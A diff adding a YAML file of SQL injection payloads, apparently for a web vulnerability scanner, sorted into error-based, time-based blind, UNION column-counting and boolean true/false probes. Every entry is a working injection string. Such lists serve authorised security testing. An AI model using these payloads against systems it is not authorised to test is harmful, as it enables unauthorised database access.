@@ -1,0 +1,34 @@
+# SQL Injection payloads organized by technique.
+# Module: scanner/modules/sqli.py
+
+error_payloads:
+  - "'"
+  - '"'
+  - "' OR '1'='1"
+  - '" OR "1"="1'
+  - "1 AND 1=2--"
+  - "' OR 1=1--"
+  - "1'"
+  - "1\""
+  - "' OR 'x'='x"
+  - "') OR ('1'='1"
+
+blind_payloads:
+  - "' AND SLEEP(5)--"
+  - "1; WAITFOR DELAY '0:0:5'--"
+  - "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)--"
+  - "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
+  - "1 AND SLEEP(5)--"
+
+union_payloads:
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+
+boolean_pairs:
+  - true: "' AND 1=1--"
+    false: "' AND 1=2--"
+  - true: "' AND 'a'='a"
+    false: "' AND 'a'='b"
